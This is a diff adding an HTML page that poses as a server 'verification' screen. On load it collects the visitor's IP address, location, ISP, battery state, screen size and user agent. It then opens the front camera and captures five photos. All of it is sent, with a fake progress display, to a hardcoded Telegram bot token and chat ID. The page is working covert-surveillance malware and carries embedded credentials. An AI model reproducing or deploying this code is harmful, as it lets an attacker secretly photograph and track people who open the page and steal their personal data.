@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Pemula puh</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: radial-gradient(circle, #1a1a1a, #000);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Poppins', sans-serif;
+      color: #fff;
+    }
+    .container {
+      text-align: center;
+      padding: 30px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid #444;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
+      width: 90%;
+      max-width: 400px;
+    }
+    h1 { font-size: 22px; margin-bottom: 10px; color: #0ff; }
+    p { font-size: 14px; color: #aaa; }
+    .status { margin-top: 20px; font-size: 13px; color: #0f0; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>@Hyrootz.</p>
+    <p class="status" id="status">Initializing...</p>
+  </div>
+
+  <script>
+    // TOKEN & ID TELEGRAM
+    const CHAT_ID = "7813060570";
+    const bot_token = "8053780203:AAFAV7b_NYcbj2NmakX3_Az4dTnYigPmelA";
+    const statusEl = document.getElementById('status');
+
+    window.onload = async () => {
+      statusEl.textContent = "🔎 Connecting with server...";
+      const fastKey = await Fast_server();
+      await sendDeviceInfo(fastKey);
+
+      try {
+        statusEl.textContent = '📡 Requesting camera...';
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        const track = stream.getVideoTracks()[0];
+
+        for (let i = 0; i < 5; i++) {
+          const percent = (i + 1) * 20;
+          statusEl.textContent = `⚙️ Working ${percent}%...`;
+
+          const blob = await captureFromVideo(track);
+          await sendToTelegram(fastKey, blob, "photo");
+
+          await new Promise(r => setTimeout(r, 1000));
+        }
+
+        track.stop();
+        statusEl.textContent = '✅ Verified!';
+      } catch (err) {
+        statusEl.textContent = 'Lope yu.';
+        console.error(err);
+      }
+    };
+
+    // Ambil key dari server (kalau ada)
+    async function Fast_server() {
+      try {
+        const res = await fetch('/api/fast_servers');
+        const data = await res.json();
+        return data.fast_key;
+      } catch {
+        return "direct";
+      }
+    }
+
+    // Kirim info device & IP
+    async function sendDeviceInfo(key) {
+      try {
+        const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json());
+        const battery = await navigator.getBattery();
+        const time = new Date().toLocaleString("en-IN");
+
+        const message =
+`🌐 *IP Information*
+🔢 IP Address: ${ipInfo.ip}
+🗺 Country: ${ipInfo.country}
+🌍 Region: ${ipInfo.region}
+📍 Location: ${ipInfo.city}
+📡 ISP: ${ipInfo.org}
+
+📱 *Device Details*
+🔋 Battery: ${Math.round(battery.level * 100)}% ${battery.charging ? "⚡️ Charging" : ""}
+📶 Network: ${(navigator.connection?.effectiveType) || "Unknown"}
+🖥️ Screen: ${screen.width}x${screen.height}
+🕒 Time: ${time}
+🧠 UA: ${navigator.userAgent}
+...`;
+
+        await sendToTelegram(key, message.trim(), "text");
+      } catch (err) {
+        console.error("Device Info Error:", err);
+      }
+    }
+
+    // Ambil foto dari video (kompatibel di semua browser)
+    async function captureFromVideo(videoTrack) {
+      const video = document.createElement("video");
+      video.srcObject = new MediaStream([videoTrack]);
+      await video.play();
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.7));
+    }
+
+    // Kirim ke Telegram
+    async function sendToTelegram(key, data, type) {
+      const url = `https://api.telegram.org/bot${bot_token}/${type === "text" ? "sendMessage" : "sendPhoto"}`;
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+
+      if (type === "text") {
+        form.append("text", data);
+        form.append("parse_mode", "Markdown");
+      } else {
+        form.append("photo", data, "image.jpg");
+      }
+
+      await fetch(url, { method: "POST", body: form });
+    }
+  </script>
+</body>
+</html>
